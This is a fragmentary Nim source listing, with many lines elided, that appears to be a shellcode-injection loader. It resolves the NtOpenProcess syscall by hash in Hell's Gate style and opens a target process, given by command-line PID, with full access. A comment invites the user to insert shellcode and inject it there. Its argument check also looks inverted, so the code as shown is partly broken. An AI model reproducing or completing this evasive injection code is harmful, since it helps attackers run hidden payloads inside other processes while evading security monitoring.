...
when isMainModule:
    ...
    if (paramCount() < 1):
        ...
        when defined(amd64):
        ## INTRODUCE YOUR SHELLCODE HERE AND INJECT IT IN THE PROCESS ID SPECIFIED
            ...
            var 
                ...
                processHash     : uint64            = djb2_hash("NtOpenProcess")
                processTable    : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : processHash)
            ...
            if getSyscall(processTable):
                var oa: OBJECT_ATTRIBUTES
                var cid: CLIENT_ID 
                cid.UniqueProcess = cast[DWORD](parseInt(paramStr(1)))
                cid.UniqueThread = 0
                syscall = processTable.wSysCall

                echo fmt"[*] Calling NtOpenProcess"
                echo fmt"OPCODE: 0x{toHex(processTable.wSyscall)}"
                status = NtOpenProcess(&pHandle, PROCESS_ALL_ACCESS, &oa, &cid)
                if not NT_SUCCESS(status):
                    echo fmt"[-] Failed to open Process."
                else:
                    echo fmt"[+] PROCESS OPENED {'\l'}"
